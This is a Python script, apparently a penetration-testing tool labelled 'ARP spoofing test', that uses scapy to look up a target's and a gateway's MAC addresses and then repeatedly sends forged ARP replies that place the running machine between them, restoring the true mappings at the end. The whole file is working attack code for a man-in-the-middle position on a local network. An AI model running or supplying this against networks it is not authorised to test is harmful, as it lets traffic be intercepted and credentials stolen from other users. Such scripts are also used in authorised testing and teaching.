import argparse
import os
import time
import ipaddress

from scapy.all import ARP,Ether,get_if_hwaddr,sendp,srp

def resolve_mac(ip,iface):
	request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)
	answered,_ = srp(request,iface=iface,timeout=2,retry=2,verbose=False)

	for _,response in answered:
		if response.haslayer(ARP) and response[ARP].psrc == ip:
			return response[ARP].hwsrc
	raise RuntimeError("No ARP response from {ip}")


def arp_reply(destination_ip,destination_mac,claimed_ip,claimed_mac):
	return ( Ether(src=claimed_mac,dst=destination_mac) / ARP(op=2,psrc=claimed_ip,hwsrc=claimed_mac,pdst=destination_ip,hwdst=destination_mac))


def main():

	parser = argparse.ArgumentParser(description="ARP spoofing test")

	parser.add_argument("--iface",required=True,help="Interface")
	parser.add_argument("--target",required=True,help="Target IP")
	parser.add_argument("--gateway",required=True,help="gateway IP")
	parser.add_argument("--seconds",type=int,default=30)

	args=parser.parse_args()

	for address in (args.target,args.gateway):
		ipaddress.IPv4Address(address)

	if args.target == args.gateway:
		parser.error("Target Ip and gateway IP are same")
	if not 1 <= args.seconds <= 300:
		parser.error("--seconds must be between 1 and 300")
	if os.geteuid() != 0:
		print("run as root to send ethernet frames")

	our_mac=get_if_hwaddr(args.iface)

	target_mac = resolve_mac(args.target,args.iface)
	gateway_mac = resolve_mac(args.gateway,args.iface)

	spoofed = [arp_reply(args.gateway,gateway_mac,args.target,our_mac),arp_reply(args.target,target_mac,args.gateway,our_mac)]

	restored = [arp_reply(args.gateway,gateway_mac,args.target,target_mac),arp_reply(args.target,target_mac,args.gateway,gateway_mac)]

	print(f"target:{args.target}.. {target_mac}")
	print(f"gateway:{args.gateway}.. {gateway_mac}")

	try:
		deadline = time.monotonic() + args.seconds

		while time.monotonic() < deadline:
			sendp(spoofed,iface=args.iface,verbose=False)
			time.sleep(2)

	except KeyboardInterrupt:
		pass 

	finally:
		print("\nAttempting to restore original ARP mappings")
		for _ in range(3):
			sendp(restored,iface=args.iface,verbose=False)
			time.sleep(0.5)


if __name__ == "__main__":
	main()
